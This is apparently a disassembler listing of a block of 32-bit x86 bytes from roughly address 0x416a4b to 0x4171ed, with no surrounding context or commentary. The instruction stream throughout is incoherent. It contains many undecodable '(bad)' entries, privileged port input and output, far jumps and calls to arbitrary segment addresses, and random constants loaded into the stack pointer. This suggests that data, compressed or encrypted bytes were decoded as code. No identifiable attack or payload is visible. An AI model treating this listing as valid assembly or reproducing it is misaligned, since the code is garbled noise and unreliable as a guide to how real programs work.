  416a4b:	or     esp,DWORD PTR ss:[ecx+0x76]
  416a4f:	jle    0x416a76
  416a51:	call   0x7640:0x44eefc5d
  416a58:	repz dec edx
  416a5a:	div    BYTE PTR [ebp-0x63d8ab0]
  416a60:	repz xchg edx,eax
  416a62:	jmp    0x392d:0xa3d74490
  416a69:	xchg   ebx,eax
  416a6a:	push   edi
  416a6b:	or     DWORD PTR [eax],edi
  416a6d:	adc    eax,0xabe58595
  416a72:	mov    ebx,0x98f331a9
  416a77:	sbb    edi,edi
  416a79:	mov    esp,0xff9b99d8
  416a7e:	xchg   edx,eax
  416a7f:	pushf  
  416a80:	cmp    edx,esp
  416a82:	std    
  416a83:	jge    0x416acf
  416a85:	cld    
  416a86:	cmp    eax,0x63754a
  416a8b:	mov    ah,0x1
  416a8d:	sahf   
  416a8e:	mov    ah,0xb0
  416a90:	inc    ebx
  416a91:	std    
  416a92:	mov    ecx,0x49d38c0b
  416a97:	dec    edi
  416a98:	popa   
  416a99:	std    
  416a9a:	push   esi
  416a9b:	inc    edx
  416a9c:	ret    
  416a9d:	dec    esi
  416a9e:	mov    esi,esp
  416aa0:	sbb    al,0x5f
  416aa2:	or     dh,BYTE PTR [ebp+0x223b5959]
  416aa8:	bound  ebx,QWORD PTR [ecx-0x29]
  416aab:	add    ebp,ebx
  416aad:	scas   eax,DWORD PTR es:[edi]
  416aae:	shl    BYTE PTR [esi+0x8527e3e],1
  416ab4:	in     al,dx
  416ab5:	pop    edx
  416ab6:	cmc    
  416ab7:	ret    
  416ab8:	push   es
  416ab9:	mov    bl,0x6a
  416abb:	and    dh,BYTE PTR [edi]
  416abd:	dec    ecx
  416abe:	sbb    BYTE PTR [edx+ebx*4+0x8],0xe1
  416ac3:	retf   0xd642
  416ac6:	add    BYTE PTR [eax-0x4531ed47],cl
  416acc:	mov    WORD PTR [ebp+0x43d265b],es
  416ad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ad3:	push   edx
  416ad4:	mov    esp,0xc71f741b
  416ad9:	out    0xfe,eax
  416adb:	fcomi  st,st(0)
  416add:	sub    dh,BYTE PTR [eax]
  416adf:	cmp    BYTE PTR [eax],bh
  416ae1:	das    
  416ae2:	ja     0x416b0b
  416ae4:	mov    WORD PTR [edi+0x3c6384af],es
  416aea:	mov    ebp,0x5e5c8224
  416aef:	scas   al,BYTE PTR es:[edi]
  416af0:	mov    ecx,0x15dc4e4a
  416af5:	xor    eax,0xa6713dcd
  416afa:	es cs cmp al,bl
  416afe:	xor    BYTE PTR [edi+0x10],cl
  416b01:	sub    ch,0x32
  416b04:	add    al,0xf8
  416b06:	pop    ecx
  416b07:	loopne 0x416aed
  416b09:	inc    eax
  416b0a:	aad    0xf7
  416b0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b0d:	sbb    dh,dl
  416b0f:	pop    ecx
  416b10:	mov    DWORD PTR [ebp-0x5defe70f],eax
  416b16:	int3   
  416b17:	daa    
  416b18:	popa   
  416b19:	out    dx,eax
  416b1a:	call   DWORD PTR [ebp+0xf]
  416b1d:	popa   
  416b1e:	aaa    
  416b1f:	test   DWORD PTR [edx],0x67bd9d7f
  416b25:	mov    eax,ds:0x8e933865
  416b2a:	call   DWORD PTR [esi+0x25831fcb]
  416b30:	mov    edi,DWORD PTR [edi+0x5e]
  416b33:	aaa    
  416b34:	mov    cl,0x8d
  416b36:	retf   0x1756
  416b39:	push   cs
  416b3a:	xor    dl,bl
  416b3c:	sub    ebx,DWORD PTR [ecx+ebp*1-0x7189c347]
  416b43:	mov    eax,0xbda915d0
  416b48:	add    eax,ecx
  416b4a:	lock sub DWORD PTR [edi-0x65],ecx
  416b4e:	aam    0x2
  416b50:	mov    ecx,0xe0d620c5
  416b55:	xchg   esp,eax
  416b56:	add    DWORD PTR [ebx+0x46aca629],edi
  416b5c:	mov    al,0xcb
  416b5e:	jne    0x416b90
  416b60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b61:	stos   DWORD PTR es:[edi],eax
  416b62:	test   al,0xb1
  416b64:	rcl    DWORD PTR [ecx-0xa],1
  416b67:	stos   DWORD PTR es:[edi],eax
  416b68:	shl    DWORD PTR [ebx-0x11],cl
  416b6b:	and    eax,0xfb40b62b
  416b70:	dec    ebp
  416b71:	loop   0x416b2c
  416b73:	mov    BYTE PTR [edx-0x34],dh
  416b76:	xor    ch,ch
  416b78:	stos   DWORD PTR es:[edi],eax
  416b79:	add    eax,0xd06f17bc
  416b7e:	cmp    BYTE PTR [edi+edx*8+0x13b08a82],dh
  416b85:	or     ch,BYTE PTR [ebx+0x73]
  416b88:	ret    0xa90b
  416b8b:	or     al,BYTE PTR [edi-0x214a6e9d]
  416b91:	sahf   
  416b92:	pop    esp
  416b93:	adc    eax,0x5eead367
  416b98:	les    ecx,FWORD PTR [edi-0x300756e]
  416b9e:	ins    BYTE PTR es:[edi],dx
  416b9f:	test   ah,0x93
  416ba2:	scas   eax,DWORD PTR es:[edi]
  416ba3:	cmp    DWORD PTR [ecx+ecx*4-0x275c2032],0x65717fd5
  416bae:	mov    ch,0x5e
  416bb0:	pusha  
  416bb1:	jns    0x416ba6
  416bb3:	pop    ebx
  416bb4:	pop    edx
  416bb5:	fisub  WORD PTR [esi]
  416bb7:	ins    DWORD PTR es:[edi],dx
  416bb8:	xchg   esi,eax
  416bb9:	out    0xed,al
  416bbb:	jg     0x416c39
  416bbd:	jecxz  0x416c2b
  416bbf:	scas   eax,DWORD PTR es:[edi]
  416bc0:	lock stos BYTE PTR es:[edi],al
  416bc2:	inc    ecx
  416bc3:	cmc    
  416bc4:	and    BYTE PTR [ecx-0x12],cl
  416bc7:	popa   
  416bc8:	fwait
  416bc9:	push   ebp
  416bca:	push   ebp
  416bcb:	fiadd  WORD PTR [esi+0x35dd7e85]
  416bd1:	inc    ecx
  416bd2:	push   es
  416bd3:	retf   
  416bd4:	dec    esp
  416bd5:	mov    ss,WORD PTR ds:0x488060c5
  416bdb:	lahf   
  416bdc:	jmp    ebp
  416bde:	shl    DWORD PTR [esp+esi*4],cl
  416be1:	xor    eax,0x7dfcc39d
  416be6:	lock outs dx,DWORD PTR ds:[esi]
  416be8:	jle    0x416b81
  416bea:	dec    esp
  416beb:	lahf   
  416bec:	(bad)
  416bef:	frstor [esi]
  416bf1:	and    al,0x37
  416bf4:	stos   BYTE PTR es:[edi],al
  416bf5:	sbb    BYTE PTR [ebx+ecx*1],0x10
  416bf9:	es inc ebp
  416bfb:	ret    0xaa68
  416bfe:	xchg   BYTE PTR [edx-0x5f],bh
  416c01:	cmp    al,0xed
  416c03:	inc    eax
  416c04:	in     al,dx
  416c05:	xchg   ebx,eax
  416c06:	fs add al,0xdf
  416c09:	js     0x416bf5
  416c0b:	jge    0x416bd2
  416c0d:	inc    esi
  416c0e:	repnz data16 fsin 
  416c12:	inc    ebx
  416c13:	and    al,0x16
  416c15:	dec    edi
  416c16:	dec    ebx
  416c17:	pop    esi
  416c18:	in     al,0x40
  416c1a:	pop    ecx
  416c1b:	mov    ebx,0xea1905dc
  416c20:	(bad)
  416c24:	add    eax,0x1c807e5b
  416c29:	push   cs
  416c2a:	retf   0xcfbe
  416c2d:	jbe    0x416c90
  416c2f:	and    bh,0x40
  416c32:	cmp    eax,DWORD PTR [edi-0x77]
  416c35:	push   ecx
  416c36:	outs   dx,BYTE PTR ds:[esi]
  416c37:	xchg   ebx,eax
  416c38:	mov    dl,0x28
  416c3a:	jne    0x416bde
  416c3c:	(bad)
  416c40:	cmp    DWORD PTR [ecx],esp
  416c42:	pushf  
  416c43:	push   esi
  416c44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c45:	xor    al,0xe9
  416c47:	fistp  DWORD PTR [ecx+0x6605b3e8]
  416c4d:	aaa    
  416c4e:	cmp    dh,dl
  416c50:	in     al,0x75
  416c52:	sub    DWORD PTR [edi+edx*4-0x24],ebp
  416c56:	aad    0xd
  416c58:	push   ds
  416c59:	test   BYTE PTR ds:0x51a87aaa,bh
  416c5f:	test   DWORD PTR [eax+0x2c],0x32338cc6
  416c66:	dec    ecx
  416c67:	mov    eax,DWORD PTR [ebp-0x1c]
  416c6a:	jmp    0x416f4e
  416c6f:	outs   dx,BYTE PTR ds:[esi]
  416c70:	ds push eax
  416c72:	loopne 0x416cd4
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	outs   dx,BYTE PTR ds:[esi]
  416c76:	mov    esi,0xcbfa089
  416c7b:	(bad)  
  416c7d:	and    ch,BYTE PTR [esi]
  416c7f:	out    dx,al
  416c80:	sbb    al,0x7f
  416c82:	jo     0x416c3d
  416c84:	jle    0x416cf6
  416c86:	jo     0x416c8b
  416c88:	adc    DWORD PTR [ecx+0x5a],esi
  416c8b:	pop    ecx
  416c8c:	(bad)  
  416c8f:	repz test DWORD PTR [edx],eax
  416c92:	dec    eax
  416c93:	adc    BYTE PTR [ebx+ecx*1],ch
  416c96:	add    al,0x1
  416c98:	leave  
  416c99:	cdq    
  416c9a:	dec    ebx
  416c9b:	sub    eax,0xec3626e7
  416ca0:	add    DWORD PTR [edx],esi
  416ca2:	adc    eax,0x74d5f94f
  416ca7:	shl    bl,1
  416ca9:	xor    BYTE PTR [eax],ch
  416cab:	xchg   esi,eax
  416cac:	(bad)  
  416cad:	dec    eax
  416cae:	cmp    ch,ah
  416cb0:	ret    0x8b73
  416cb3:	enter  0x17af,0x11
  416cb7:	or     al,0x8d
  416cb9:	data16 jnp 0x416d04
  416cbc:	jb     0x416c89
  416cbe:	popa   
  416cbf:	rol    BYTE PTR [ecx-0x9],cl
  416cc2:	outs   dx,BYTE PTR ds:[esi]
  416cc3:	imul   ah
  416cc5:	std    
  416cc6:	push   edi
  416cc7:	mov    WORD PTR [esi-0x1482bc0f],fs
  416ccd:	(bad)  
  416cce:	sub    edx,DWORD PTR [esi-0x6a]
  416cd1:	cdq    
  416cd2:	jnp    0x416c94
  416cd4:	and    BYTE PTR [esi-0x57],dh
  416cd7:	push   ds
  416cd8:	sbb    BYTE PTR [eax+0x222567e7],cl
  416cde:	pop    eax
  416cdf:	ret    
  416ce0:	loope  0x416d10
  416ce2:	sahf   
  416ce3:	dec    edi
  416ce4:	and    edi,DWORD PTR [edi-0x59]
  416ce7:	cld    
  416ce8:	je     0x416cbf
  416cea:	adc    bl,BYTE PTR [ecx+0x3425d152]
  416cf0:	or     dh,BYTE PTR [edx]
  416cf2:	lahf   
  416cf3:	iret   
  416cf4:	jne    0x416ce9
  416cf6:	sbb    bl,BYTE PTR [ebx+0x3e]
  416cf9:	mov    BYTE PTR ss:[ecx],ch
  416cfc:	cmp    al,0xd9
  416cfe:	pop    edx
  416cff:	and    DWORD PTR [eax-0x7],esi
  416d02:	jb     0x416c92
  416d04:	les    eax,FWORD PTR [edi+0x14]
  416d07:	icebp  
  416d08:	mov    ecx,0x16366985
  416d0d:	mov    eax,ds:0xad697f1b
  416d12:	pop    es
  416d13:	leave  
  416d14:	inc    ebx
  416d15:	(bad)  
  416d16:	and    ch,BYTE PTR [edx+0x7a163ce9]
  416d1c:	cmp    dl,BYTE PTR [ebp+0x73]
  416d1f:	lock sbb al,0xf
  416d22:	or     al,0x60
  416d24:	push   edx
  416d25:	fcom   QWORD PTR [ebx]
  416d27:	lock mov cl,0x64
  416d2a:	outs   dx,DWORD PTR ds:[esi]
  416d2b:	sub    edx,DWORD PTR [eax]
  416d2d:	dec    esi
  416d2e:	cmp    al,0x79
  416d30:	jmp    0x416cd3
  416d32:	add    ebx,0xc501050c
  416d38:	gs das 
  416d3a:	cld    
  416d3b:	mov    al,ds:0xe285e978
  416d40:	outs   dx,BYTE PTR ds:[esi]
  416d41:	pop    edx
  416d42:	inc    ecx
  416d43:	mov    esi,0x86fce24d
  416d48:	and    cl,ah
  416d4a:	(bad)  
  416d4b:	adc    dh,ah
  416d4d:	test   DWORD PTR [edi-0x76e68619],0xe4f089b
  416d57:	mov    al,ds:0xa546fecb
  416d5c:	adc    ch,BYTE PTR [ecx]
  416d5e:	aaa    
  416d5f:	test   DWORD PTR [edx+0x3a6dc9d9],ecx
  416d65:	inc    ebx
  416d66:	shr    DWORD PTR [edx+0x428dfd3a],cl
  416d6c:	loopne 0x416cf7
  416d6e:	adc    ebp,DWORD PTR [eax+edx*1-0x10]
  416d72:	mov    ?,WORD PTR [eax+0x6fb07bb]
  416d78:	or     esi,ebp
  416d7a:	jo     0x416d14
  416d7c:	cmp    BYTE PTR [esi-0x55e0399d],dl
  416d82:	jecxz  0x416d70
  416d84:	fistp  DWORD PTR [ecx]
  416d86:	pusha  
  416d87:	ins    BYTE PTR es:[edi],dx
  416d88:	es clc 
  416d8a:	popf   
  416d8b:	xchg   ebp,eax
  416d8c:	mov    ebp,eax
  416d8e:	hlt    
  416d8f:	adc    ebx,ebp
  416d91:	lods   al,BYTE PTR ds:[esi]
  416d92:	xchg   esp,eax
  416d93:	jb     0x416de5
  416d95:	mov    eax,ds:0x5d19f2ff
  416d9a:	outs   dx,DWORD PTR ds:[esi]
  416d9b:	add    ch,cl
  416d9d:	bound  eax,QWORD PTR [eax]
  416d9f:	repnz mov ds,WORD PTR [edi-0x75]
  416da3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416da4:	adc    BYTE PTR [edi-0x62],ah
  416da7:	sub    BYTE PTR [ecx+eiz*8],dh
  416daa:	call   0x9492:0xa6b63f2b
  416db1:	outs   dx,BYTE PTR gs:[esi]
  416db3:	jbe    0x416d7c
  416db5:	sbb    edi,ecx
  416db7:	sahf   
  416db8:	mov    edx,0x914eed4b
  416dbd:	xor    edi,esi
  416dbf:	cmp    ebp,eax
  416dc1:	cwde   
  416dc2:	or     ebp,eax
  416dc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dc5:	and    ebp,DWORD PTR [ecx+0x12]
  416dc8:	call   DWORD PTR [esi+edx*2+0xb4ed83a]
  416dcf:	xor    bl,BYTE PTR [ebp-0x17b144ef]
  416dd5:	push   eax
  416dd6:	fidiv  DWORD PTR [eax]
  416dd8:	pop    edi
  416dd9:	fldenv [eax+0x1f0beaf1]
  416ddf:	ins    BYTE PTR es:[edi],dx
  416de0:	sbb    esp,edx
  416de2:	push   ecx
  416de3:	scas   eax,DWORD PTR es:[edi]
  416de4:	in     al,0xc0
  416de6:	mov    edx,0x1011b99d
  416deb:	adc    eax,0xbc4437d6
  416df0:	test   eax,0xc4487571
  416df5:	pop    edi
  416df6:	mov    eax,0x23e28e9c
  416dfb:	fwait
  416dfc:	out    0x68,eax
  416dfe:	idiv   BYTE PTR [edi+edx*4]
  416e01:	push   ebx
  416e02:	imul   esi,DWORD PTR [ebx-0x3a],0x40
  416e06:	pop    ds
  416e07:	mov    edi,0x60ebee34
  416e0c:	out    dx,eax
  416e0d:	or     ch,ch
  416e0f:	jge    0x416e3f
  416e11:	push   ecx
  416e12:	popa   
  416e13:	mov    esi,0xb5e3c669
  416e18:	jo     0x416dac
  416e1a:	cmp    esp,esi
  416e1c:	mov    cl,0x8a
  416e1e:	cli    
  416e1f:	adc    eax,0x6a0e0db0
  416e24:	scas   al,BYTE PTR es:[edi]
  416e25:	out    dx,eax
  416e26:	sar    esi,1
  416e28:	fcomip st,st(3)
  416e2a:	push   ebx
  416e2b:	test   al,0x53
  416e2d:	sbb    DWORD PTR [edi+0x2d],ecx
  416e30:	push   ds
  416e31:	and    al,0x12
  416e33:	jle    0x416e21
  416e35:	push   cs
  416e36:	cwde   
  416e37:	mov    ?,WORD PTR [edx]
  416e39:	sbb    DWORD PTR [ecx+edi*2-0x7871c9ab],0x5d95a834
  416e44:	sbb    esp,DWORD PTR [ebx-0x755e9e46]
  416e4a:	clc    
  416e4b:	ds fmul st,st(4)
  416e4e:	xlat   BYTE PTR ds:[ebx]
  416e4f:	jp     0x416ea0
  416e51:	loopne 0x416e1a
  416e53:	sub    dl,BYTE PTR [eax-0x582492cb]
  416e59:	or     BYTE PTR [esi-0x70],ah
  416e5c:	push   0x7b3a2146
  416e61:	cmp    al,0xe9
  416e63:	and    edx,edi
  416e65:	test   BYTE PTR [esi+0x60bd9560],0x6b
  416e6c:	sub    DWORD PTR [esi-0x78832d0c],ebp
  416e72:	out    0xc8,al
  416e74:	xlat   BYTE PTR ds:[ebx]
  416e75:	xor    eax,0x87cdf391
  416e7a:	pushf  
  416e7b:	sub    al,dl
  416e7d:	dec    ebx
  416e7e:	push   ds
  416e7f:	push   ecx
  416e80:	test   eax,0xbb1fb894
  416e85:	pop    ds
  416e86:	data16 aad 0x71
  416e89:	inc    esi
  416e8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e8b:	mov    cl,0xc1
  416e8d:	enter  0xa061,0x66
  416e91:	rol    BYTE PTR [edx],cl
  416e93:	mov    ds:0xbbd8fe46,eax
  416e98:	cmp    edi,DWORD PTR [ebx-0x4e3787da]
  416e9e:	jo     0x416e7e
  416ea0:	sbb    al,0x55
  416ea2:	adc    DWORD PTR ds:0x88fa8f3f,ecx
  416ea8:	mov    dl,0xe2
  416eaa:	fnsave [ecx+0x45d9bab6]
  416eb0:	icebp  
  416eb1:	jno    0x416f2f
  416eb3:	jle    0x416ec9
  416eb5:	rol    BYTE PTR [esi],1
  416eb7:	jae    0x416f2c
  416eb9:	inc    ebp
  416eba:	pop    ds
  416ebb:	sub    cl,0xd7
  416ebe:	pop    ebp
  416ebf:	jnp    0x416e6b
  416ec1:	mov    bh,0x42
  416ec3:	in     eax,dx
  416ec4:	imul   ecx,ecx,0x62
  416ec7:	fwait
  416ec8:	loopne 0x416f17
  416eca:	add    dl,bl
  416ecc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ecd:	adc    al,0x7a
  416ecf:	add    eax,DWORD PTR [edx-0x41a93c66]
  416ed5:	xor    DWORD PTR [ebp+0x75],0xffffffb5
  416ed9:	inc    esi
  416eda:	outs   dx,DWORD PTR ds:[esi]
  416edb:	shl    esi,0x32
  416ede:	arpl   si,cx
  416ee0:	inc    esi
  416ee1:	push   ss
  416ee2:	jae    0x416f43
  416ee4:	adc    eax,0xac5b53cf
  416ee9:	or     ecx,DWORD PTR [ebp+edx*8+0x6156ae6e]
  416ef0:	scas   al,BYTE PTR es:[edi]
  416ef1:	pop    ecx
  416ef2:	xchg   ebp,eax
  416ef3:	jmp    0x2c99:0xaefee8fc
  416efa:	pusha  
  416efb:	cs je  0x416e80
  416efe:	sub    BYTE PTR ds:[esi],ch
  416f01:	add    bh,BYTE PTR [eax]
  416f03:	js     0x416f6f
  416f05:	sbb    ah,BYTE PTR [ebx+ebp*2-0x5f9e1a77]
  416f0c:	mov    bl,0xc2
  416f0e:	jbe    0x416eef
  416f10:	out    0x61,eax
  416f12:	push   ecx
  416f13:	mov    eax,ds:0x48803f2d
  416f18:	push   ebp
  416f19:	out    0x24,al
  416f1b:	jns    0x416f01
  416f1d:	xor    DWORD PTR [eax],ebp
  416f1f:	add    eax,0xfa2501f0
  416f24:	outs   dx,BYTE PTR ds:[esi]
  416f25:	add    BYTE PTR [ecx],dh
  416f27:	clc    
  416f28:	stos   DWORD PTR es:[edi],eax
  416f29:	mov    ch,0x36
  416f2b:	jne    0x416f1c
  416f2d:	call   0xb8f4:0x972160e0
  416f34:	lahf   
  416f35:	jmp    0xd5c8:0x3449dff0
  416f3c:	rcl    DWORD PTR ss:[edi-0x1a],0xa5
  416f41:	dec    eax
  416f42:	loope  0x416f9e
  416f44:	cmp    edi,DWORD PTR [edi-0x6c452767]
  416f4a:	(bad)  [ebx+edx*4-0x23]
  416f4e:	imul   eax,ecx
  416f51:	add    esp,eax
  416f53:	xchg   edx,eax
  416f54:	push   eax
  416f55:	xor    ebx,ebx
  416f57:	mov    edx,esp
  416f59:	jmp    0x41723d
  416f5e:	cmp    al,0x58
  416f60:	push   esp
  416f61:	add    dh,BYTE PTR [edx+esi*1+0x4a]
  416f65:	data16 (bad) 
  416f68:	and    ch,cl
  416f6a:	add    bl,BYTE PTR [edx-0x64]
  416f6d:	inc    esi
  416f6e:	aaa    
  416f6f:	sbb    DWORD PTR [edi+0x70],edi
  416f72:	mov    ecx,0xb070707e
  416f77:	xchg   edi,eax
  416f78:	mov    eax,0x35f61b88
  416f7d:	ficom  WORD PTR [edi+0x7e]
  416f80:	sbb    eax,0xf44cb082
  416f85:	bound  edi,QWORD PTR [edx]
  416f87:	lds    esp,FWORD PTR [edx+edi*1]
  416f8a:	mov    ds:0xf57edb1d,eax
  416f8f:	sub    al,0xb8
  416f91:	shl    edx,cl
  416f93:	xchg   edx,eax
  416f94:	xchg   BYTE PTR [ebp-0x52],bh
  416f97:	pop    esp
  416f98:	adc    ah,BYTE PTR [ecx-0x56bda367]
  416f9e:	test   BYTE PTR [eax+0x14],ah
  416fa1:	jp     0x416f9a
  416fa3:	inc    DWORD PTR [eax+0x2b7a95c4]
  416fa9:	int3   
  416faa:	(bad)  
  416fab:	xor    dh,ch
  416fad:	in     eax,0x86
  416faf:	or     al,0xfe
  416fb1:	ins    DWORD PTR es:[edi],dx
  416fb2:	pop    ebp
  416fb3:	adc    DWORD PTR [edi+0x6d],ebx
  416fb6:	mov    bl,0x8f
  416fb8:	cmp    BYTE PTR [ecx],bh
  416fba:	pop    ss
  416fbb:	sub    ch,bl
  416fbd:	and    BYTE PTR [ebp+0x1e09f816],bl
  416fc3:	loopne 0x416f7c
  416fc5:	mov    ds:0xb214d668,al
  416fca:	push   0x8e9b7a20
  416fcf:	neg    BYTE PTR [edi+0x3f8d8d6f]
  416fd5:	xchg   esi,eax
  416fd6:	pop    ss
  416fd7:	mov    ebp,0x6e83c079
  416fdc:	xchg   edi,eax
  416fdd:	sub    eax,0xc79cc28e
  416fe2:	jg     0x416f95
  416fe4:	lods   al,BYTE PTR ds:[esi]
  416fe5:	sbb    BYTE PTR [esi-0x6ac0a82c],bh
  416feb:	jae    0x416ff6
  416fed:	mov    gs,WORD PTR [eax]
  416fef:	pop    es
  416ff0:	test   al,0x6c
  416ff2:	ja     0x41703e
  416ff4:	call   0x82b2:0xe68c6737
  416ffb:	aad    0xc9
  416ffd:	outs   dx,BYTE PTR ds:[esi]
  416ffe:	push   ebx
  416fff:	fcomp  QWORD PTR [ecx-0x36]
  417002:	aas    
  417003:	fisttp WORD PTR [esi]
  417005:	add    eax,DWORD PTR [ecx+0xbd6672a]
  41700b:	push   esp
  41700c:	scas   eax,DWORD PTR es:[edi]
  41700d:	fld    DWORD PTR [ecx]
  41700f:	inc    ecx
  417010:	(bad)  
  417011:	mov    DWORD PTR [ebx+0xc6aa1],esi
  417017:	out    dx,al
  417018:	ret    0x9fec
  41701b:	mov    bh,0x8
  41701d:	mov    DWORD PTR [eax-0x7e],esi
  417020:	(bad)  
  417021:	xchg   ebx,eax
  417022:	inc    ecx
  417023:	int    0x62
  417025:	int3   
  417026:	daa    
  417027:	jle    0x416fb1
  417029:	add    eax,DWORD PTR [ebp-0x2928e62]
  41702f:	mov    esi,0xd2ee6d6a
  417034:	mov    bl,0xc8
  417036:	sbb    eax,0x7865e629
  41703b:	cmp    BYTE PTR [edx+ebx*8],ch
  41703e:	push   eax
  41703f:	pop    ss
  417040:	mov    dl,0x41
  417042:	adc    al,0x20
  417044:	fisubr DWORD PTR [edx+0x7e14449f]
  41704a:	popa   
  41704b:	mov    ds:0xbc878c9f,eax
  417050:	mov    bh,0x9b
  417052:	sub    eax,0x6facb7a3
  417057:	imul   ecx,DWORD PTR [ebx],0x78
  41705a:	dec    ebp
  41705b:	pop    edi
  41705c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41705d:	jae    0x416fed
  41705f:	(bad)  
  417060:	inc    ebp
  417061:	inc    eax
  417062:	jne    0x4170b4
  417064:	pop    ebp
  417065:	mov    BYTE PTR [esi-0x247ab85],dh
  41706b:	fwait
  41706c:	shl    ebp,0xae
  41706f:	jns    0x417046
  417071:	bound  esi,QWORD PTR cs:[edx-0x1db229d]
  417078:	jp     0x4170b6
  41707a:	push   edx
  41707b:	ror    ch,1
  41707d:	jg     0x4170c5
  41707f:	cs dec ebx
  417081:	pop    esi
  417082:	mov    ds,WORD PTR [edi]
  417084:	fsubr  QWORD PTR [edx+0x3a38ede8]
  41708a:	(bad)  
  41708b:	dec    esp
  41708c:	leave  
  41708d:	xor    ebx,ecx
  41708f:	fs sti 
  417091:	int3   
  417092:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417093:	call   0xae9d3aec
  417098:	(bad)  
  417099:	int3   
  41709a:	(bad)  
  41709b:	push   0xffffffe2
  41709d:	loope  0x417021
  41709f:	jecxz  0x4170ca
  4170a1:	jmp    FWORD PTR [esi+0x20146ece]
  4170a7:	cs xchg ebx,eax
  4170a9:	fiadd  WORD PTR [esi-0x5c]
  4170ac:	inc    ecx
  4170ad:	mov    eax,ds:0xfddd81f
  4170b2:	cmp    DWORD PTR [edi+esi*4+0x2e671e60],0xca118b1e
  4170bd:	xchg   esp,eax
  4170be:	loopne 0x4170d7
  4170c0:	aas    
  4170c1:	sub    BYTE PTR [edx-0x5b],ch
  4170c4:	rcr    ch,1
  4170c6:	sbb    eax,0xb97fe75d
  4170cb:	ss dec ebp
  4170cd:	lods   al,BYTE PTR ds:[esi]
  4170ce:	jne    0x417076
  4170d0:	jns    0x4170bf
  4170d2:	fcmovnb st,st(0)
  4170d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170d5:	mov    bh,0x2c
  4170d7:	push   esp
  4170d8:	retf   0xb23e
  4170db:	stos   BYTE PTR es:[edi],al
  4170dc:	int3   
  4170dd:	xchg   ecx,eax
  4170de:	int    0x1
  4170e0:	retf   
  4170e1:	cmc    
  4170e2:	push   ds
  4170e3:	lea    edi,[edi]
  4170e5:	jbe    0x417114
  4170e7:	ja     0x4170eb
  4170e9:	dec    esp
  4170ea:	cmp    al,BYTE PTR [edx]
  4170ec:	adc    BYTE PTR [eax+0x7a6b0e54],bl
  4170f2:	dec    ebp
  4170f3:	push   cs
  4170f4:	xchg   ebp,eax
  4170f5:	push   dx
  4170f7:	scas   eax,DWORD PTR es:[edi]
  4170f8:	pushf  
  4170f9:	cmp    ch,0x97
  4170fc:	push   ecx
  4170fd:	fcmovnu st,st(4)
  4170ff:	cs jl  0x41711d
  417102:	nop
  417103:	sub    BYTE PTR [ecx+0x1bcb9f21],dl
  417109:	sbb    al,0xf6
  41710b:	jnp    0x417113
  41710d:	push   cs
  41710e:	adc    bl,BYTE PTR [ebx+0x43fa45c1]
  417114:	loope  0x4170e5
  417116:	fiadd  DWORD PTR [ebp-0x4b]
  417119:	out    0x93,al
  41711b:	jmp    eax
  41711d:	(bad)  
  41711f:	imul   esi,DWORD PTR gs:[edi+0x51],0x72
  417124:	(bad)  
  417125:	adc    eax,0x348771ba
  41712a:	pop    esp
  41712b:	ins    DWORD PTR es:[edi],dx
  41712c:	scas   al,BYTE PTR es:[edi]
  41712d:	and    eax,0xdd2ceb0
  417132:	push   es
  417133:	sub    eax,0x4fcb4074
  417138:	sub    ebx,esi
  41713a:	mov    dl,0xb8
  41713c:	and    eax,0x720620f5
  417141:	cmp    al,0xe2
  417143:	mov    al,0x6c
  417145:	test   al,0xdc
  417147:	push   ds
  417148:	sti    
  417149:	shr    DWORD PTR [esi+0x3d],cl
  41714c:	push   ss
  41714d:	iret   
  41714e:	retf   0x83c3
  417151:	imul   ecx,DWORD PTR [ebx-0x49e84cfd],0x8d787a9e
  41715b:	(bad)  
  41715c:	cmp    al,0x71
  41715e:	jl     0x41716a
  417160:	inc    esi
  417161:	mov    bh,0x18
  417163:	dec    ecx
  417164:	stos   BYTE PTR es:[edi],al
  417165:	sub    ebp,DWORD PTR [eax-0x5c]
  417168:	sbb    dl,0xb3
  41716b:	sub    BYTE PTR [ecx-0x3c679c6f],al
  417171:	push   esi
  417172:	jo     0x417103
  417174:	aaa    
  417175:	jmp    0x989042a1
  41717a:	out    dx,al
  41717b:	fyl2xp1 
  41717d:	rol    DWORD PTR [edi-0x233da275],cl
  417183:	les    esp,FWORD PTR [ebp-0x6eacc80e]
  417189:	add    DWORD PTR [esi],eax
  41718b:	adc    eax,eax
  41718d:	std    
  41718e:	lods   eax,DWORD PTR ds:[esi]
  41718f:	mov    ds:0xfe7294e,al
  417194:	pop    ds
  417195:	aam    0xa1
  417197:	ficomp WORD PTR [ebx-0x7b]
  41719a:	xchg   ebp,eax
  41719b:	add    ch,cl
  41719d:	jbe    0x41720d
  41719f:	xor    bh,BYTE PTR ds:0xdd3fd30c
  4171a5:	in     eax,dx
  4171a6:	mov    esp,0xe4f0f925
  4171ab:	test   al,0xc6
  4171ad:	sti    
  4171ae:	add    BYTE PTR [esi+0x3339dac1],bl
  4171b4:	push   ecx
  4171b5:	dec    ebp
  4171b6:	pop    ebx
  4171b7:	aad    0x40
  4171b9:	test   BYTE PTR [ebx+0x26260625],cl
  4171bf:	dec    ebp
  4171c0:	pop    edi
  4171c1:	and    DWORD PTR [ebx+ecx*2-0x7],ecx
  4171c5:	scas   al,BYTE PTR es:[edi]
  4171c6:	cmp    ebp,esp
  4171c8:	fdivrp st(5),st
  4171ca:	xchg   esp,edi
  4171cc:	push   cs
  4171cd:	xor    eax,0x10b437f8
  4171d2:	pushf  
  4171d3:	or     eax,0x1f7b3d00
  4171d8:	and    ebx,DWORD PTR [edx-0x2eed29f0]
  4171de:	sub    eax,0x910cf4e1
  4171e3:	pop    DWORD PTR [eax-0x35]
  4171e6:	out    0x61,eax
  4171e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171e9:	shld   ebp,esp,cl
  4171ec:	pop    ds
  4171ed:	imul   ebp,DWORD PTR [eax],0x8f99cab
